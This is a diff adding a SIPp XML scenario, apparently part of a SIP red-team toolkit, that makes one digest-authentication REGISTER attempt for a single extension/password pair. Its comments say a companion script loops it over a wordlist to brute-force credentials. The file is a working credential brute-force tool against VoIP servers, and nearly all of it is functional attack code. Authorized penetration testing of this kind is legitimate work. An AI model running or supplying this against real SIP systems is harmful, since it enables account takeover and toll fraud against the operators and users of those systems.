@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="ISO-8859-1" ?>
+<!DOCTYPE scenario SYSTEM "sipp.dtd">
+
+<!-- digest_bruteforce.xml
+     One credential-pair attempt per SIPp invocation - scenarios/
+     digest_bruteforce.py runs this once per extension/password pair
+     from its wordlist, passing the extension via -s and the password
+     via -ap (see that module's docstring for why: SIPp's own
+     [authentication] keyword takes its credentials from the -au/-ap/-s
+     CLI flags for the whole process, not from per-call substitution -
+     [authentication username=[field0] password=[field1]] looked
+     plausible but silently corrupted the Authorization header, since
+     SIPp doesn't support keyword nesting inside that keyword's own
+     bracket syntax. Confirmed by directly inspecting the raw bytes
+     sent over the wire (tests/unit doesn't touch a real sipp process,
+     so this only showed up running against a real mock target - same
+     lesson as every other real-sipp discovery already documented in
+     CHANGELOG.md). -->
+
+<!-- IMPORTANT: [call_id] must be used verbatim as the entire Call-ID
+     header value, unprefixed and unsuffixed - see every other scenario
+     file's identical warning; the reason is the same here. -->
+
+<scenario name="Digest Bruteforce - one credential pair attempt">
+
+  <send retrans="500">
+    <![CDATA[
+
+      REGISTER sip:[remote_ip]:[remote_port] SIP/2.0
+      Via: SIP/2.0/[transport] [local_ip]:[local_port];branch=[branch]
+      From: <sip:[service]@[remote_ip]>;tag=[call_number]
+      To: <sip:[service]@[remote_ip]>
+      Call-ID: [call_id]
+      CSeq: 1 REGISTER
+      Contact: <sip:[service]@[local_ip]:[local_port]>
+      Max-Forwards: 70
+      User-Agent: SIP-Redteam-Toolkit-DigestBruteforce
+      Expires: 3600
+      Content-Length: 0
+
+    ]]>
+  </send>
+
+  <!-- auth="true" tells SIPp to remember this challenge (realm/nonce)
+       for the [authentication] keyword below - SIPp's own built-in
+       digest-auth support, not anything hand-rolled here. If the
+       target never challenges (e.g. it drops instead, or doesn't
+       recognize this extension), this recv doesn't match within
+       recv_timeout and the attempt fails - the same "not successful"
+       signal every other scenario relies on. -->
+  <recv response="401" auth="true"></recv>
+
+  <send retrans="500">
+    <![CDATA[
+
+      REGISTER sip:[remote_ip]:[remote_port] SIP/2.0
+      Via: SIP/2.0/[transport] [local_ip]:[local_port];branch=[branch]
+      From: <sip:[service]@[remote_ip]>;tag=[call_number]
+      To: <sip:[service]@[remote_ip]>
+      Call-ID: [call_id]
+      CSeq: 2 REGISTER
+      Contact: <sip:[service]@[local_ip]:[local_port]>
+      Max-Forwards: 70
+      User-Agent: SIP-Redteam-Toolkit-DigestBruteforce
+      Expires: 3600
+      [authentication]
+      Content-Length: 0
+
+    ]]>
+  </send>
+
+  <!-- Same "exactly one mandatory recv" rule as every other scenario
+       (see baseline_probe.xml) - 200 the one mandatory close. A wrong
+       password (401/403 again) or a silent drop both surface as the
+       same "credential pair did not succeed" signal. -->
+  <recv response="200"></recv>
+
+</scenario>
